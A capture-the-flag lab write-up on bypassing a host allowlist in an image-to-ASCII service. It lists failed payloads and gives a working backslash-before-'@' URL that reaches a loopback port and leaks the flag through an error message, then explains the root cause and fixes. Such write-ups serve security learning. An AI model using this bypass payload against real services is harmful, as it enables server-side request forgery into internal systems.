# AsciiSnap Pwnbox Lab - Backslash Userinfo Allowlist SSRF

Date: 2026-07-10
Target type: CTF/lab
Host: `https://23e6b8ca4bb0.pwnbox-lab.com/`
Bug class: SSRF, host allowlist bypass, backslash/`@` parser confusion, response-oracle via image-type error

## Observation

AsciiSnap converts uploaded images to ASCII art.

Flow from `/js/main.js`:

1. `POST /api/upload` with `image` file → `{ url: "http://[host]/uploads/[id].png" }`
2. `POST /api/render` with JSON `{ url }` → `{ ascii }` or error

About: `Can you see localhost:1337?`

Direct loopback:

```text
POST /api/render {"url":"http://127.0.0.1:1337/"}
→ URL rejected: URL must be from pwnbox-lab.com
```

## Hypothesis

Allowlist requires the string/host to involve `pwnbox-lab.com`, but validator and HTTP client disagree on authority parsing. Classic candidates: userinfo `@`, fragments, backslash, encoding.

## Evidence

### Normal path works

Upload PNG → render same-origin upload URL → ASCII returned.

### Failed bypasses (confirmed rejected or useless)

| Payload class | Result |
|---|---|
| Plain `127.0.0.1:1337` / `localhost:1337` | rejected |
| Fragment `#pwnbox-lab.com` | rejected |
| `allowed@127.0.0.1:1337` | rejected |
| `127.0.0.1:1337@allowed` | accepted by allowlist but fetched public HTML (not :1337) |
| Decimal/hex IP, `file:`, `gopher:` | rejected |

### Working bypass

```text
http://127.0.0.1:1337\@23e6b8ca4bb0.pwnbox-lab.com/
```

Response:

```json
{"error":"URL did not return an image (got: 'text/plain') — response: pwnbox{...}"}
```

## Working theory

- Validator sees `pwnbox-lab.com` in the authority/string (backslash does not end the “host-looking” token the way a normal parser would).
- Executor treats `\` specially and connects to `127.0.0.1:1337`.
- Non-image responses are reflected in the error body → oracle for the flag.

## Root cause

Incomplete host allowlist plus URL parser confusion on backslash before `@`, with full upstream body reflected when Content-Type is not an image.

## Fix

- Parse with one strict URL library; validate `hostname` / `origin` only after normalization.
- Reject `\`, userinfo, and unexpected ports unless required.
- After DNS resolve, block loopback/private/link-local.
- Do not reflect arbitrary upstream bodies in client errors; return generic failures.

## Reusable outputs

- `writeups/asciisnap-backslash-userinfo-allowlist-ssrf.md`
- `notes/ssrf-backslash-userinfo-allowlist-bypass.md`
- `payloads/ssrf/backslash-at-allowlist-loopback-bypass.md`
- Updates to `checklists/ssrf-parser-confusion.md`, `notes/ssrf-substring-allowlist-fragment-bypass.md`
